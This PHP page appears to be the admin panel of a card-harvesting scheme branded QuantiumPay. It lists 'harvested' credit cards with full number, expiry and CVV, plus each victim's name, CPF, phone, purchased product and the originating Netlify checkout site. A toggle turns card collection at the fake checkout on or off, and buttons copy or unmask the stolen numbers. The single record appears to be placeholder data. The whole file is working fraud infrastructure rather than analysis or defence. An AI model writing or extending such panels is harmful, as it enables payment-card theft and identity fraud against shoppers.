<?php
// ccs/index.php
$titulo = 'CCs Colhidas - QuantiumPay';
$menuAtivo = 'ccs';
include '../includes/header.php';

// Simulação de banco de dados para a listagem
$ccsColhidas = [
    [
        'id' => 1,
        'numero' => '6376536785876523',
        'titular' => 'CARLOS 777',
        'validade' => '09/37',
        'cvv' => '3343',
        'data_hora' => '22/04/2026, 08:38:57',
        'nome_cliente' => 'Carlos Teste',
        'cpf' => '156.056.726-06',
        'telefone' => '11987654343',
        'produto' => 'Kit de 10 ferramentas - Original',
        'valor' => '4,00',
        'origem' => 'cute-lolly-5f39ad.netlify.app'
    ]
];
?>

<div class="p-8 max-w-7xl mx-auto fade-in">

    <div class="bg-white border border-gray-200 rounded-xl p-5 mb-8 flex items-center justify-between shadow-sm">
        <div>
            <h2 class="text-base font-bold text-gray-900 mb-1">Coleta de cartão no checkout</h2>
            <p class="text-sm text-gray-500" id="status-coleta">Ativo — opção de cartão visível no checkout</p>
        </div>

        <label class="relative inline-flex items-center cursor-pointer">
            <input type="checkbox" id="toggle-coleta" class="sr-only peer" checked>
            <div
                class="w-11 h-6 bg-gray-200 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-gray-900">
            </div>
        </label>
    </div>

    <h3 class="text-sm font-bold text-gray-900 mb-4">CCs Colhidas (<?php echo count($ccsColhidas); ?>)</h3>

    <div class="flex flex-col gap-4">
        <?php foreach ($ccsColhidas as $cc): ?>
            <div class="bg-white border border-gray-200 rounded-xl p-5 shadow-sm hover:shadow transition-shadow relative group"
                id="cc-card-<?php echo $cc['id']; ?>">

                <div class="flex items-center justify-between mb-4">
                    <div class="flex items-center gap-2 font-mono text-gray-900 font-medium">
                        <i class="ph ph-credit-card text-lg text-gray-500"></i>
                        <span class="cc-numero"
                            data-numero="<?php echo $cc['numero']; ?>"><?php echo $cc['numero']; ?></span>
                    </div>
                    <div class="flex items-center gap-2 text-gray-400">
                        <button onclick="copiarCC('<?php echo $cc['numero']; ?>')"
                            class="p-1 hover:bg-gray-100 hover:text-gray-900 rounded transition-colors" title="Copiar">
                            <i class="ph ph-copy text-lg"></i>
                        </button>
                        <button onclick="toggleOcultar(this)"
                            class="p-1 hover:bg-gray-100 hover:text-gray-900 rounded transition-colors"
                            title="Ocultar/Exibir">
                            <i class="ph ph-eye-slash text-lg icone-olho"></i>
                        </button>
                        <button onclick="deletarCC(<?php echo $cc['id']; ?>)"
                            class="p-1 hover:bg-red-50 hover:text-red-600 text-red-500 rounded transition-colors"
                            title="Excluir">
                            <i class="ph ph-trash text-lg"></i>
                        </button>
                    </div>
                </div>

                <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-4 text-sm text-gray-500">
                    <div>Titular: <span class="text-gray-900 font-medium"><?php echo $cc['titular']; ?></span></div>
                    <div>Validade: <span class="text-gray-900 font-medium"><?php echo $cc['validade']; ?></span></div>
                    <div>CVV: <span class="text-gray-900 font-medium"><?php echo $cc['cvv']; ?></span></div>
                </div>

                <div class="flex items-center gap-2 text-xs text-gray-500 mb-3">
                    <i class="ph ph-calendar-blank text-base"></i> <?php echo $cc['data_hora']; ?>
                </div>

                <div class="flex flex-wrap items-center gap-x-6 gap-y-2 text-xs text-gray-900 mb-4">
                    <div class="flex items-center gap-1.5"><i class="ph ph-user text-gray-500 text-base"></i>
                        <?php echo $cc['nome_cliente']; ?></div>
                    <div class="flex items-center gap-1.5"><i class="ph ph-identification-card text-gray-500 text-base"></i>
                        <?php echo $cc['cpf']; ?></div>
                    <div class="flex items-center gap-1.5"><i class="ph ph-device-mobile text-gray-500 text-base"></i>
                        <?php echo $cc['telefone']; ?></div>
                </div>

                <div class="flex flex-wrap items-center justify-between border-t border-gray-100 pt-3">
                    <div class="flex items-center gap-1.5 text-xs text-gray-500">
                        <i class="ph ph-shopping-cart text-base"></i> <?php echo $cc['produto']; ?>
                    </div>
                    <div class="text-right flex flex-col items-end">
                        <span class="text-sm font-medium text-gray-900 mb-0.5">R$ <?php echo $cc['valor']; ?></span>
                        <span class="text-[10px] text-gray-400">Origem: <?php echo $cc['origem']; ?></span>
                    </div>
                </div>

            </div>
        <?php endforeach; ?>
    </div>
</div>

<script>
    // Lógica do Toggle Switch
    const toggleColeta = document.getElementById('toggle-coleta');
    const statusColeta = document.getElementById('status-coleta');

    if (toggleColeta) {
        toggleColeta.addEventListener('change', (e) => {
            if (e.target.checked) {
                statusColeta.textContent = 'Ativo — opção de cartão visível no checkout';
            } else {
                statusColeta.textContent = 'Inativo — opção de cartão oculta no checkout';
            }
            // Aqui você adicionaria a requisição AJAX para salvar a configuração no banco
        });
    }

    // Copiar número do cartão
    function copiarCC(numero) {
        navigator.clipboard.writeText(numero).then(() => {
            alert('Número do cartão copiado!');
        }).catch(err => {
            console.error('Erro ao copiar: ', err);
        });
    }

    // Ocultar/Exibir número do cartão (Máscara)
    function toggleOcultar(btn) {
        const cardContainer = btn.closest('.bg-white'); // Encontra o card pai
        const numSpan = cardContainer.querySelector('.cc-numero');
        const icone = btn.querySelector('.icone-olho');
        const numeroReal = numSpan.getAttribute('data-numero');

        if (numSpan.textContent.includes('*')) {
            // Revelar
            numSpan.textContent = numeroReal;
            icone.classList.remove('ph-eye');
            icone.classList.add('ph-eye-slash');
        } else {
            // Ocultar (deixa apenas os 4 últimos dígitos)
            const ultimos4 = numeroReal.slice(-4);
            numSpan.textContent = '**** **** **** ' + ultimos4;
            icone.classList.remove('ph-eye-slash');
            icone.classList.add('ph-eye');
        }
    }

    // Deletar card da listagem
    function deletarCC(id) {
        if (confirm('Tem certeza que deseja excluir este registro permanentemente?')) {
            const card = document.getElementById('cc-card-' + id);
            if (card) {
                card.remove();
                // Aqui você adicionaria a requisição AJAX para deletar do banco
                // Atualizar o contador de CCs (Opcional visualmente)
            }
        }
    }
</script>

<?php
include '../includes/footer.php';
?>